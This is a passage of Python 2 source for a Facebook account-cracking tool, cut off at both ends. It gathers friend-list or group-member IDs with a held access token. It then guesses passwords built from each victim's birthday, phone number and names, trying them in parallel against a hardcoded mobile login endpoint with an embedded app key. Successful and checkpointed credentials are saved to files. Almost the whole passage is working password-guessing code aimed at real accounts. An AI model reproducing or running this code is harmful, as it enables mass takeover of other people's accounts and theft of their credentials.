                                oksave.write(user + ' | ' + pass3 + nem + '\n')
                                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    cpsave.write(user + ' | ' + pass3 + nem + '\n')
                                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                else:
                                    pass4 = b['last_name'] + b['first_name']
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        oksave.write(user + ' | ' + pass4 + nem + '\n')
                                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            cpsave.write(user + ' | ' + pass4 + nem + '\n')
                                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id2)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    hackname()

def hackphone():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK VIA PHONE NUMBER' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    hackphonelist()

def hackphonelist():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        hackphonelist()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK VIA PHONE NUMBER' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            winzon('    \x1b[1;91m    [+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id3.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK VIA PHONE NUMBER' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                idg = raw_input('    \x1b[1;91m    [+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '    \x1b[1;91m    [\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '    \x1b[1;91m    [!] Group Not Found'
                    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    hackphone()
                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id3.append(i['id'])
            else:
                if peak == '0':
                    autohack()
                else:
                    print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    hackphonelist()
    print '    \x1b[1;91m    [+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(id3))
    winzon('    \x1b[1;91m    [\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '    \r\r\x1b[1;91m        [\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            nem = ' [' + b['name'] + ']'
            ph = b['mobile_phone']
            mob = ph.replace('+63', '0')
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mob + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + mob + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + mob
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + mob + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + mob
                else:
                    uae = b['mobile_phone']
                    mob2 = uae.replace('+971', '0')
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mob2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        oksave.write(user + ' | ' + mob2 + nem + '\n')
                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + mob2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            cpsave.write(user + ' | ' + mob2 + nem + '\n')
                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + mob2
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id3)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    hackphone()

def hackbday():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	    HACK VIA BIRTHDAY' + 10 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    hackbdaylist()

def hackbdaylist():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        hackbdaylist()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	    HACK VIA BIRTHDAY' + 10 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            winzon('    \x1b[1;91m    [+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id4.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	    HACK VIA BIRTHDAY' + 10 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                idg = raw_input('    \x1b[1;91m    [+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '    \x1b[1;91m    [\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '    \x1b[1;91m    [!] Group Not Found'
                    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    hackbday()
                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id4.append(i['id'])
            else:
                if peak == '0':
                    autohack()
                else:
                    print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    hackbdaylist()
    print '    \x1b[1;91m    [+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(id4))
    winzon('    \x1b[1;91m    [\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '    \r\r\x1b[1;91m        [\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            nem = ' [' + b['name'] + ']'
            bday = b['birthday']
            pass1 = bday.replace('/', '')
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + pass1 + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + pass1 + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id4)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    hackbday()

def freehunt():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	       FREE HUNTING' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    freehuntlist()

def freehuntlist():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        freehuntlist()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	       FREE HUNTING' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            zon = raw_input('    \x1b[1;91m	[+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
            winzon('    \x1b[1;91m    [+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                ida.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	       FREE HUNTING' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
                idg = raw_input('    \x1b[1;91m    [+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '    \x1b[1;91m    [\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '    \x1b[1;91m    [!] Group Not Found'
                    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    freehunt()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    ida.append(i['id'])

            else:
                if peak == '0':
                    manhack()
                else:
                    print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    freehuntlist()
    print '    \x1b[1;91m    [+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(ida))
    winzon('    \x1b[1;91m    [\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '    \r\r\x1b[1;91m        [\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            nem = ' [' + b['name'] + ']'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + zon + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + zon + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + zon
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + zon + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + zon
        except:
            pass

    p = ThreadPool(30)
    p.map(main, ida)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    freehunt()

def afname():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK AFTER FIRST NAME' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    afnamelist()

def afnamelist():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        afnamelist()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK AFTER FIRST NAME' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
            winzon('    \x1b[1;91m    [+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r2 = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r2.text)
            for s in z['data']:
                idb.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK AFTER FIRST NAME' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
                idg = raw_input('    \x1b[1;91m    [+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '    \x1b[1;91m    [\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '    \x1b[1;91m    [!] Group Not Found'
                    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    afname()

                ra = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(ra.text)
                for i in s['data']:
                    idb.append(i['id'])

            else:
                if peak == '0':
                    manhack()
                else:
                    print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    afnamelist()
    print '    \x1b[1;91m    [+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(idb))
    winzon('    \x1b[1;91m    [\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '    \r\r\x1b[1;91m        [\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a1 = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a1.text)
            nem = ' [' + b['name'] + ']'
            win = b['first_name'] + zon
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + win + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + win + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + win
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + win + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + win
                else:
                    inzo = b['first_name'] + zon
                    win2 = (inzo.lower())
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + win2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        oksave.write(user + ' | ' + win2 + nem + '\n')
                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + win2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            cpsave.write(user + ' | ' + win2 + nem + '\n')
                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + win2
        except:
            pass

    p1 = ThreadPool(30)
    p1.map(main, idb)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    afname()

def alname():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK AFTER LAST NAME' + 9 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    alnamelist()

def alnamelist():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        alnamelist()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK AFTER LAST NAME' + 9 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
            winzon('    \x1b[1;91m    [+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r2 = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r2.text)
            for s in z['data']:
                idc.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK AFTER LAST NAME' + 9 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
                idg = raw_input('    \x1b[1;91m    [+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '    \x1b[1;91m    [\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '    \x1b[1;91m    [!] Group Not Found'
                    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    alname()

                ra = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(ra.text)
                for i in s['data']:
                    idc.append(i['id'])

            else:
                if peak == '0':
                    manhack()
                else:
                    print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    alnamelist()
    print '    \x1b[1;91m    [+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(idc))
    winzon('    \x1b[1;91m    [\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '    \r\r\x1b[1;91m        [\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a1 = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a1.text)
            nem = ' [' + b['name'] + ']'
            win = b['last_name'] + zon
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + win + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + win + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + win
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + win + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + win
                else:
                    inzo = b['last_name'] + zon
                    win2 = (inzo.lower())
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + win2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        oksave.write(user + ' | ' + win2 + nem + '\n')
                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + win2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            cpsave.write(user + ' | ' + win2 + nem + '\n')
                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + win2
        except:
            pass

    p1 = ThreadPool(30)
    p1.map(main, idc)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    alname()

def bfname():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK BEFORE FIRST NAME' + 7 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    bfnamelist()

def bfnamelist():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
